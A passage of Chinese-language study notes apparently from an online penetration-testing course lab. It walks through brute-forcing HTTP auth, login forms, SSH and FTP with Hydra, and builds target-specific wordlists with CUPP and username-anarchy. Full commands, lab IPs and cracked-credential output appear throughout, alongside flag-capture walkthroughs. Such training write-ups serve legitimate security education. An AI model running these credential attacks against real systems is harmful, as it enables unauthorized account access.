william.txt</code></td><td>删除没有数字的密码</td></tr><tr><td><code>./username-anarchy Bill Gates &gt; bill.txt</code></td><td>生成用户名列表</td></tr><tr><td><code>ssh b.gates@SERVER_IP -p PORT</code></td><td>通过 SSH 到服务器</td></tr><tr><td><code>ftp 127.0.0.1</code></td><td>FTP 到服务器</td></tr><tr><td><code>su - user</code></td><td>切换到用户</td></tr></tbody></table><p>以下是可以包含哈希密码的文件的小列表：</p><table><thead><tr><th><strong><code>Windows</code></strong></th><th><strong><code>Linux</code></strong></th></tr></thead><tbody><tr><td>unattend.xml</td><td>shadow</td></tr><tr><td>sysprep.inf</td><td>shadow.bak</td></tr><tr><td>SAM</td><td>password</td></tr></tbody></table><p>由于密码不能从哈希值向后计算，因此暴力方法确定属于随机选择的密码的哈希值，直到哈希值与存储的哈希值匹配为止。在这种情况下，会找到密码。这种方法也称为离线暴力强制。本模块将侧重于在线暴力，并明确处理网站的登录表单。 在大多数网站上，总会有一个供管理员、作者和用户登录的区域。此外，用户名在网页上通常是可识别的，而复杂的密码很少被使用，因为它们很难记住。因此，如果我们不能确定任何初始立足点，那么在适当的枚举后使用在线暴力强制方法是值得的。 有许多工具和方法可用于强制登录，如：</p><ul><li><code>Ncrack</code></li><li><code>wfuzz</code></li><li><code>medusa</code></li><li><code>patator</code></li><li><code>hydra</code></li><li>and others.</li></ul><p>在本模块中，我们将主要使用hydra，因为它是可用的最常见和最可靠的工具之一。 将讨论以下主题：</p><ul><li>Brute forcing basic HTTP auth</li><li>Brute force for default passwords</li><li>Brute forcing login forms</li><li>Brute force usernames</li><li>Creating personalized username and password wordlists based on our target</li><li>Brute forcing service logins, such as FTP and SSH</li></ul><h1 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h1><p>HTTP规范提供了两种并行身份验证机制：</p><ul><li>Basic HTTP AUTH:基本HTTP AUTH用于向HTTP服务器验证用户。 </li><li>Basic HTTP AUTH:代理服务器身份验证用于向中间代理服务器验证用户。</li></ul><p><strong>Password Attack Type</strong></p><table><thead><tr><th><code>Dictionary attack</code></th></tr></thead><tbody><tr><td><code>Brute force</code></td></tr><tr><td><code>Traffic interception</code></td></tr><tr><td><code>Man In the Middle</code></td></tr><tr><td><code>Key Logging</code></td></tr><tr><td><code>Social engineering</code></td></tr></tbody></table><p>字典攻击 蛮力 交通拦截 中间人 密钥日志记录 社会工程</p><h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>Hydra是Login Brute Forcing的一个方便工具，因为它涵盖了各种各样的攻击和服务，并且与其他攻击和服务相比速度相对较快。它可以测试任何一对证书，并验证它们是否成功，但数量巨大，速度非常快。 如果我们想在自己的机器上使用它，我们可以使用“apt-install-hydra-y”，也可以从其Github存储库下载并使用它， 我们可以查看hydra提供的选项，并查看其标志和如何使用的示例：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -hSyntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]Options:&lt;...SNIP...&gt;  -s PORT   if the service is on a different default port, define it here  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE  -u        loop around users, not passwords (effective! implied with -x)  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)  service   the service to crack (see below for supported protocols)&lt;...SNIP...&gt;Examples:  hydra -l user -P passlist.txt ftp://192.168.0.1  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5  hydra -l admin -p password ftp://[192.168.0.0/24]/  hydra -L logins.txt -P pws.txt -M targets.txt ssh</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task[DATA] attacking http-get://178.211.23.155:31099/[31099][http-get] host: 178.211.23.155   login: test   password: testingpw[STATUS] attack finished for 178.211.23.155 (valid pair found)1 of 1 target successfully completed, 1 valid password found</code></pre><table><thead><tr><th><strong>Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-C ftp-betterdefaultpasslist.txt</code></td><td>Combined Credentials Wordlist</td></tr><tr><td><code>SERVER_IP</code></td><td>Target IP</td></tr><tr><td><code>-s PORT</code></td><td>Target Port</td></tr><tr><td><code>http-get</code></td><td>Request Method</td></tr><tr><td><code>/</code></td><td>Target Path</td></tr></tbody></table><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:46.101.95.166:30237</p></blockquote><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307101049862.png" alt="image-20230710104911976"></p><p>主要是使用-C</p><h1 id="Username-Brute-Force"><a href="#Username-Brute-Force" class="headerlink" title="Username Brute Force"></a>Username Brute Force</h1><p>我们现在知道了hydra的基本用法，所以让我们尝试另一个通过使用用户名和密码的单独单词列表来攻击HTTP基本身份验证的例子。</p><h2 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h2><p>最常用的密码单词列表之一是rockyou.txt，它有1400多万个唯一密码，按常见程度排序，这些密码是从网上泄露的密码和用户名数据库中收集的。基本上，除非密码真的是唯一的，否则这个单词列表很可能会包含它。Rockyou.txt已经存在于我们的Pwnbox中。如果我们在本地虚拟机上使用hydra，我们可以从 <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">Hashcat GitHub Repository</a>存储库下载这个单词列表。</p><h2 id="Username-x2F-Password-Attack"><a href="#Username-x2F-Password-Attack" class="headerlink" title="Username&#x2F;Password Attack"></a>Username&#x2F;Password Attack</h2><p>如果凭据在一个列表中，则Hydra至少需要3个特定标志才能对web服务执行暴力攻击： 资格证书 目标主机 目标路径 凭据也可以由用户名和密码分隔。我们可以将-L标志用于用户名单词列表，将-P标志用于密码单词列表。由于我们不想强行将所有用户名与列表中的密码相结合，我们可以通过指定标志-f来告诉hydra在第一次成功登录后停止。</p><blockquote><p>提示：我们将添加“-u”标志，以便它在每个密码上尝试所有用户，而不是在一个用户上尝试所有1400万个密码，然后再转到下一个。</p></blockquote><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task[DATA] attacking http-get://178.35.49.134:32901/[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active&lt;...SNIP...&gt;[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1[STATUS] attack finished for SERVER_IP (valid pair found)1 of 1 target successfully completed, 1 valid password found</code></pre><h2 id="Username-Brute-Force-1"><a href="#Username-Brute-Force-1" class="headerlink" title="Username Brute Force"></a>Username Brute Force</h2><p>如果我们只是粗暴地使用用户名或密码，我们可以分配一个具有相同标志但小写的静态用户名或密码。例如，我们可以通过添加-l test，然后添加一个带有-P rockyou.txt的密码单词列表，对测试用户强制执行密码。 由于我们已经在上一节中找到了密码，我们可以使用“-p”标志静态地分配它，并且仅对可能使用此密码的用户名使用暴力。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task[DATA] attacking http-get://178.35.49.134:32901/[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:46.101.95.166:30237</p></blockquote><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307101141107.png" alt="image-20230710114148111"></p><p>这里要注意语句顺序问题</p><h1 id="Hydra-Modules"><a href="#Hydra-Modules" class="headerlink" title="Hydra Modules"></a>Hydra Modules</h1><p>由于我们在渗透测试期间在Web服务器上为管理员找到了一个登录表单，因此这是一个非常有趣的组件，我们应该尝试在不产生太多网络流量的情况下访问它。最后，使用管理面板，我们可以管理服务器、它们的服务和配置。许多管理面板还实现了 <a href="https://github.com/b374k/b374k">b374k shell</a> 等功能或元素，这些功能或元素可能允许我们直接执行操作系统命令。</p><h2 id="Brute-Forcing-Forms"><a href="#Brute-Forcing-Forms" class="headerlink" title="Brute Forcing Forms"></a>Brute Forcing Forms</h2><p>Hydra提供了许多不同类型的请求，我们可以使用这些请求来强制执行不同的服务。如果我们使用hydra-h，我们应该能够列出支持的服务：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -h | grep &quot;Supported services&quot; | tr &quot;:&quot; &quot;\n&quot; | tr &quot; &quot; &quot;\n&quot; | column -eSupported        ldap3[-&#123;cram|digest&#125;md5][s]rshservices        memcachedrtsp                            mongodbs7-300adam6500        mssqlsipasterisk        mysqlsmbcisco        nntpsmtp[s]cisco-enable        oracle-listenersmtp-enumcvs            oracle-sidsnmpfirebird        pcanywheresocks5ftp[s]        pcnfssshhttp[s]-&#123;head|get|post&#125;pop3[s]sshkeyhttp[s]-&#123;get|post&#125;-formpostgressvnhttp-proxy        radmin2teamspeakhttp-proxy-urlenum    rdp      telnet[s]icq            redisvmauthdimap[s]        rexecvncirc            rloginxmppldap2[s]        rpcap</code></pre><p>在这种情况下，只有两种类型的http模块对我们感兴趣：</p><ol><li><code>http[s]-&#123;head|get|post&#125;</code></li><li><code>http[s]-post-form</code></li></ol><p>第一个模块用于基本的HTTP身份验证，而第二个模块用于登录表单，如.php或.aspx等。 由于文件扩展名是“.php”，我们应该尝试http[s]-post-form模块。为了决定我们需要哪个模块，我们必须确定web应用程序是使用GET还是POST表单。我们可以通过尝试登录并关注URL来测试它。如果我们识别出我们的任何输入都被粘贴到了URL中，那么web应用程序将使用GET表单。否则，它将使用POST表单。</p><p>要了解如何使用http post表单模块，我们可以使用“-U”标志列出它所需的参数和使用示例：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra http-post-form -U&lt;...SNIP...&gt;Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]First is the page on the server to GET or POST to (URL).Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the &quot;^USER^&quot; and &quot;^PASS^&quot; placeholdersThe third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by &quot;F=&quot;, successful condition login check must be preceded by &quot;S=&quot;.&lt;...SNIP...&gt;Examples: &quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;</code></pre><p>总之，我们需要提供三个参数，用：分隔，如下所示：</p><ol><li><code>URL path</code>, which holds the login form</li><li><code>POST parameters</code> for username&#x2F;password</li><li><code>A failed/success login string</code>, which lets hydra recognize whether the login attempt was successful or not</li></ol><p>如果我们提供一个失败的字符串，它将一直查找，直到在响应中找不到该字符串为止。另一种方法是，如果我们提供一个成功字符串，它将一直查找，直到在响应中找到该字符串。一个更好的策略是从登录页面的HTML源中选择一些内容。 我们必须选择的内容应该不太可能在登录后出现，比如登录按钮或密码字段。</p><pre><code class="html">  &lt;form name=&#39;login&#39; autocomplete=&#39;off&#39; class=&#39;form&#39; action=&#39;&#39; method=&#39;post&#39;&gt;</code></pre><p>我们在几个地方看到它作为标题&#x2F;标题，我们在上面显示的HTML表单中找到了我们的按钮。我们不必提供整个字符串，所以我们将使用&lt;form name&#x3D;’login’，它应该足够明显，并且在成功登录后可能不存在。 因此，http post表单的语法应该如下所示：</p><pre><code class="bash">&quot;/login.php:[user parameter]=^USER^&amp;[password parameter]=^PASS^:F=&lt;form name=&#39;login&#39;&quot;</code></pre><h1 id="Determine-Login-Parameters"><a href="#Determine-Login-Parameters" class="headerlink" title="Determine Login Parameters"></a>Determine Login Parameters</h1><p>如果我们使用Burp Suite拦截登录请求，或者仔细查看管理面板的源代码，我们可以很容易地找到POST参数。</p><h1 id="Login-Form-Attacks"><a href="#Login-Form-Attacks" class="headerlink" title="Login Form Attacks"></a>Login Form Attacks</h1><p>在我们的情况下，我们没有任何关于现有用户名或密码的信息。由于我们列举了所有可用的端口，但无法确定任何有用的信息，因此我们可以选择结合http post-form模块测试web应用程序表单的默认凭据。</p><h2 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h2><p>让我们尝试使用带有默认凭据的ftp-betterdefaultpasslist.txt列表来测试其中一个帐户是否已在web应用程序中注册。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;Hydra v9.1 (c) d020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;1 of 1 target completed, 0 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><h2 id="Password-Wordlist"><a href="#Password-Wordlist" class="headerlink" title="Password Wordlist"></a>Password Wordlist</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra)[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123[STATUS] attack finished for 178.35.49.134 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target : 46.101.95.166:30237</p></blockquote><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307110951584.png" alt="image-20230711095122914"></p><p>我们确定登录需要的参数：<code>username</code> <code>password</code></p><p>然后使用hydra:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111003116.png" alt="image-20230711100351354"></p><pre><code>hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -f 94.237.54.69 -s 44601 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot; </code></pre><p>验证一下：登陆成功</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111005728.png" alt="image-20230711100520203"></p><h1 id="Personalized-Wordlists"><a href="#Personalized-Wordlists" class="headerlink" title="Personalized Wordlists"></a>Personalized Wordlists</h1><h2 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h2><p>我们通过指定-i参数以交互模式运行它，并回答一系列问题可以得到一个个性化密码本：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cupp -i___________   cupp.py!                 # Common      \                     # User       \   ,__,             # Passwords        \  (oo)____         # Profiler           (__)    )\              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]                            [ Mebus | https://github.com/Mebus/][+] Insert the information about the victim to make a dictionary[+] If you don&#39;t know all the info, just hit enter when asked! ;)&gt; First Name: William&gt; Surname: Gates&gt; Nickname: Bill&gt; Birthdate (DDMMYYYY): 28101955&gt; Partners) name: Melinda&gt; Partners) nickname: Ann&gt; Partners) birthdate (DDMMYYYY): 15081964&gt; Child&#39;s name: Jennifer&gt; Child&#39;s nickname: Jenn&gt; Child&#39;s birthdate (DDMMYYYY): 26041996&gt; Pet&#39;s name: Nila&gt; Company name: Microsoft&gt; Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory&gt; Do you want to add special chars at the end of words? Y/[N]: y&gt; Do you want to add some random numbers at the end of words? Y/[N]:y&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y[+] Now making a dictionary...[+] Sorting list and removing duplicates...[+] Saving dictionary to william.txt, counting 43368 words.[+] Now load your pistolero with william.txt and shoot! Good luck!</code></pre><p>我们生成的个性化密码单词列表大约有43000行。由于我们在登录时看到了密码策略，我们知道密码必须满足以下条件： 8个字符或更长 包含特殊字符 包含数字 因此，我们可以从我们的单词列表中删除任何不符合这些条件的密码。一些工具会将密码策略转换为Hashcat或John规则，但hydra不支持过滤密码的规则。因此，我们只需使用以下命令即可完成此操作：</p><h2 id="Password-Policy"><a href="#Password-Policy" class="headerlink" title="Password Policy"></a>Password Policy</h2><p>我们生成的个性化密码单词列表大约有43000行。由于我们在登录时看到了密码策略，我们知道密码必须满足以下条件： 8个字符或更长 包含特殊字符 包含数字 因此，我们可以从我们的单词列表中删除任何不符合这些条件的密码。一些工具会将密码策略转换为Hashcat或John规则，但hydra不支持过滤密码的规则。因此，我们只需使用以下命令即可完成此操作：</p><pre><code class="bash">sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt            # remove shorter than 8sed -ri &#39;/[!-/:-@\[-`\&#123;-~]+/!d&#39; william.txt # remove no special charssed -ri &#39;/[0-9]+/!d&#39; william.txt            # remove no numbers</code></pre><h2 id="Mangling"><a href="#Mangling" class="headerlink" title="Mangling"></a>Mangling</h2><p>仍然可以为该列表中的每个单词创建许多排列。我们永远不知道我们的目标在创建密码时是怎么想的，因此我们最安全的选择是添加尽可能多的更改和排列，并注意到这当然需要更多的时间来使用暴力。 许多伟大的工具可以快速轻松地进行单词处理和大小写排列，比如 <a href="https://github.com/digininja/RSMangler">rsmangler</a>或 <a href="https://github.com/sc0tfree/mentalist.git">The Mentalist</a>。这些工具还有许多其他选项，可以使任何小的单词列表达到数百万行。我们应该记住这些工具，因为我们可能在其他模块和情况下需要它们。 作为一个起点，我们将坚持我们迄今为止生成的单词列表，不对其进行任何篡改。如果我们的单词列表没有成功登录，我们将返回这些工具并进行一些篡改，以增加我们猜测密码的机会。</p><h2 id="Custom-Username-Wordlist"><a href="#Custom-Username-Wordlist" class="headerlink" title="Custom Username Wordlist"></a>Custom Username Wordlist</h2><p>我们还应该考虑根据此人的可用详细信息创建一个个性化的用户名单词列表。例如，此人的用户名可以是b.gates或gates或bill，以及许多其他可能的变体。有几种方法可以创建潜在用户名列表，其中最基本的方法就是手动编写。 我们可以使用的一个工具是 <a href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a>，我们可以从GitHub克隆它，如下所示：</p><p>该工具有许多用例，我们可以利用这些用例来创建潜在用户名的高级列表。然而，对于我们的简单用例，我们可以简单地运行它，并提供名字&#x2F;姓氏作为参数，然后将输出转发到一个文件中，如下所示：</p><pre><code class="bash">./username-anarchy Bill Gates &gt; bill.txt</code></pre><p>我们最终应该准备好用户名和密码的单词列表，这样我们就可以攻击SSH服务器了。</p><h1 id="Service-Authentication-Brute-Forcing"><a href="#Service-Authentication-Brute-Forcing" class="headerlink" title="Service Authentication Brute Forcing"></a>Service Authentication Brute Forcing</h1><h2 id="SSH-Attack"><a href="#SSH-Attack" class="headerlink" title="SSH Attack"></a>SSH Attack</h2><p>用于攻击登录服务的命令相当简单。我们只需提供用户名&#x2F;密码单词列表，并添加service:&#x2F;&#x2F;SERVER_IP:PORT最后。像往常一样，我们将添加-u-f标志。最后，当我们第一次运行该命令时，hydra将建议我们为最大并行尝试次数添加-t 4标志，因为许多SSH限制了并行连接的数量并丢弃其他连接，导致我们的许多尝试被丢弃。我们的最终命令如下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task[DATA] attacking ssh://178.35.49.134:22/[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...[STATUS] attack finished for 178.35.49.134 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22b.gates@SERVER_IP&#39;s password: ********b.gates@bruteforcing:~$ whoamib.gates</code></pre><h2 id="FTP-Brute-Forcing"><a href="#FTP-Brute-Forcing" class="headerlink" title="FTP Brute Forcing"></a>FTP Brute Forcing</h2><p>一旦我们进入，我们就可以查看系统上的其他用户</p><pre><code class="shell-session">b.gates@bruteforcing:~$ ls /homeb.gates  m.gates</code></pre><p>我们注意到另一个用户m.gates。我们在本地侦察中也注意到端口21在本地打开，这表明FTP必须可用：</p><pre><code class="shell-session">b.gates@bruteforcing:~$ netstat -antp | grep -i list(No info could be read for &quot;-p&quot;: geteuid()=1000 but you should be root.)tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -tcp6       0      0 :::80                   :::*                    LISTEN      -   </code></pre><p>接下来，我们现在可以尝试强制m.gates用户进行FTP登录。</p><blockquote><p>注1：有时管理员会使用不同的工具测试他们的安全措施和策略。在这种情况下，该web服务器的管理员一直安装着“hydra”。我们可以从中受益，并通过本地或远程攻击FTP服务来对抗本地系统。</p></blockquote><blockquote><p>注2：rockyou-10.txt是“rockyu.txt”的较短版本，包含14344391个密码。</p></blockquote><p>因此，与我们攻击SSH服务的方式类似，我们可以对FTP进行类似的攻击：</p><pre><code class="shell-session">b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task[DATA] attacking ftp://127.0.0.1:21/[21][ftp] host: 127.0.0.1   login: m.gates   password: &lt;...SNIP...&gt;1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><p>要切换到该用户：</p><pre><code class="shell-session">b.gates@bruteforcing:~$ su - m.gates</code></pre><h2 id="practice1-1"><a href="#practice1-1" class="headerlink" title="practice1.1"></a>practice1.1</h2><blockquote><p>target:94.237.55.13：34133</p><p>使用您在本节中学到的知识，尝试在上面显示的目标服务器中暴力破解用户“b.gates”的SSH登录。然后尝试通过 SSH 连接到服务器。</p></blockquote><p>先用cupp做一个字典：大体按照学院的示例中的内容填写</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111116559.png" alt="image-20230711111612191"></p><p>密码策略：</p><pre><code class="bash">sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt            # remove shorter than 8sed -ri &#39;/[!-/:-@\[-`\&#123;-~]+/!d&#39; william.txt # remove no special charssed -ri &#39;/[0-9]+/!d&#39; william.txt            # remove no numbers</code></pre><p>这里他给了用户名，静态分配用户名即可就不必生成用户名字典了</p><pre><code>hydra -l b.gates -P william.txt -u -f ssh://94.237.55.13:34133</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111122537.png" alt="image-20230711112243016"></p><p>然后到home中拿到flag</p><h2 id="practice1-2"><a href="#practice1-2" class="headerlink" title="practice1.2"></a>practice1.2</h2><blockquote><p>ssh登录后，尝试强制其他用户进行FTP登录。您应该在它们的主目录中找到另一个flag.</p></blockquote><p>我们在home文件中知道另一个用户是m.gates，并且在本用户目录下给了一个rockyou文本，并且服务器安装了hydra那么按照示例中的操作打就可以了;</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111128017.png" alt="image-20230711112849950"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111136428.png" alt="image-20230711113652067"></p><h1 id="Skills-Assessment-—-website"><a href="#Skills-Assessment-—-website" class="headerlink" title="Skills Assessment — website"></a>Skills Assessment <em>— website</em></h1><blockquote><p>我们的客户要求对其网络上的另一台主机进行额外的黑匣子渗透测试。经过主机和端口扫描，我们发现只有一个TCP端口打开。由于我们已经在另一台主机上发现了弱凭据，因此新主机可能容易受到相同漏洞类型的攻击。在我们的参与过程中，我们也应该考虑不同的单词表。</p><p>target : 94.237.59.206:39321</p><p>当你试图访问上面显示的IP时，你将没有访问它的授权。强行进行身份验证并检索flag。</p><p>一旦你访问了登录页面，你的任务就是强行进入这个页面。里面藏着什么flag？</p></blockquote><p>根据提示该主机有弱凭据，并且让考虑不同的单词表，应该就是说使用不同的Default-Credentials 字典爆破：</p><p>这里使用了尝试使用了一下简写：     </p><p><code>hydra -C ftp-betterdefaultpasslist.txt http-get://94.237.59.206:39321</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111250415.png" alt="image-20230711125048090"></p><p>登录网页得到第一个flag，并且又可以进入这个login页面</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111255019.png" alt="image-20230711125518477"></p><p>按照之前的做法，先去看看登录时发送的参数以及传参方式，这里跟示例中一样是post传参并且参数为user和pass，然后失败的判定字符串为这个login表单,这里我们截取一部分就好了：</p><pre><code>form name=&#39;log-in&#39;</code></pre><p>在示例中两个页面的用户名是一样的，这里是不是也一样呢？毕竟只是作为一个工具练习，没必要用两个字典跑很久，如果不行就只能找用户名字典＋rockyou了</p><pre><code>hydra -l user -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 94.237.59.206 -s 39321 http-post-form &quot;/admin_login.php:user=^USER^&amp;pass=^PASS^:F=form name=&#39;log-in&#39;&quot;</code></pre><p>这里尝试简写但是失败了，只能老老实实来，然后也要注意语序</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111341779.png" alt="image-20230711134140132"></p><p>这里挺离谱的，我直接在浏览器里F12查看post包，然后就顺带在里面看源码，结果发现F12里面的的标签<code>form name=&#39;log-in&#39;</code>是双引号，导致爆破半天密码不对，很无语</p><h1 id="Skills-Assessment-—-Service-Login"><a href="#Skills-Assessment-—-Service-Login" class="headerlink" title="Skills Assessment — Service Login"></a>Skills Assessment — Service Login</h1><blockquote><p>我们得到了一个在线学院的IP地址，但没有关于他们网站的进一步信息。作为进行渗透测试的第一步，我们必须确定网站和其他登录服务中是否使用了任何弱凭据。 不仅仅关注默认&#x2F;通用密码。使用本模块中学习的技能收集有关我们确定的员工的信息，以创建自定义单词列表来攻击他们的帐户。 使用我们在模块部分介绍的技能攻击web应用程序并提交两个标志，然后提交它们以完成本模块。</p><p>target:83.136.255.143:58141</p><p>由于您现在已经掌握了上一个技能评估问题中员工的姓名，请尝试收集他们的基本信息，并生成符合密码策略的自定义密码单词列表。还可以使用“用户名生成器”为员工生成潜在用户名。最后，尝试强行使用上面显示的SSH服务器来获取标志。</p><p>一旦您进入，您应该会发现服务器中存在另一个用户。尝试强行登录，并获取他们的标志。</p></blockquote><p>这里看描述应该是进行后半段的复现，这里只有一个名字是Harry potter，先try：</p><p><code>cupp -i </code>先创建一个只有名字为信息的密码本</p><p>使用<code>anarchy</code>生成用户名:<code>./username-anarchy Harry Potter &gt; harry.txt</code></p><p>然后用生成的两个文本进行爆破，根据题目应该是使用ssh：</p><pre><code>hydra -L username-anarchy/harry.txt -P harry.txt -u -f ssh://83.136.255.143:58141 -t 4</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111704081.png" alt="image-20230711170429477"></p><p>还是跑了挺长时间的，这里ssh连接要使用-p 指定端口,不然会显示权限被拒绝，可能是默认访问的端口没给权限。</p><p>ssh连接后就更之前示例中的联系一毛一样了，给了个rockyou然后通过ftp横向移动：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111713249.png" alt="image-20230711171301439"></p><p><code>hydra -l g.potter -P rockyou-30.txt -u -f ftp://127.0.0.1</code></p><p><img 